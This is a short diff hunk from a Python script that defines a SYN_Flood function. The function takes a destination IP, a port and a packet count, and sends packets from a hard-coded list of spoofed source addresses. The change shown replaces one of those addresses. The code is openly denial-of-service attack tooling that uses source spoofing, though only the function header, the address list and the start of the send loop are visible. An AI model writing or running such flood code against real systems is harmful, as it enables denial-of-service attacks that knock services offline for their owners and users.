@@ -12,7 +12,7 @@ def randInt():
 
 def SYN_Flood(dstIP,dstPort,counter):
     total = 0
-    ip_list = ["6.4.19.89", "12.7.19.41", "2.24.20.22", "6.28.19.14", "9.1.19.39", "11.30.19.39", "9.17.19.91"] #Set of nonsensical IP Addresses
+    ip_list = ["6.4.19.89", "12.7.19.41", "2.24.20.22", "1.26.18.41", "9.1.19.39", "11.30.19.39", "9.17.19.91"] #Set of nonsensical IP Addresses
     print ("Sending Packets...")
   
     for x in range (0, counter):
